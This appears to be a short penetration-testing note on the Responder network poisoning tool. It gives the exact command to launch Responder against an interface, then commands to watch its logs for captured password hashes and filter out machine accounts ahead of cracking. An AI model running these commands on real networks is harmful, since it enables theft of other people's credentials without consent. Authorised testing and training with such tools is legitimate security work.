# Responder

A network poisoner and fantastic for grabbing hashes for further cracking.  [Grab the tool](https://github.com/SpiderLabs/Responder) and then take careful look at the help (`responder.py -h`) to ensure you're launching with the right flags, as stuff can break.  I usually use:

    python /opt/Responder/Responder.py -I eth0 -Ffr

Then, once things are getting poisoned, it's easy to "watch" the logs directory for .txt files of hashes by doing:

    watch -n5 cat /opt/Responder/logs/*.txt

Now, I'm not interested in system accounts with a dollar sign in them, so to see accounts *without* that character, you can do:

    grep -v '\$' /opt/Responder/logs/*.txt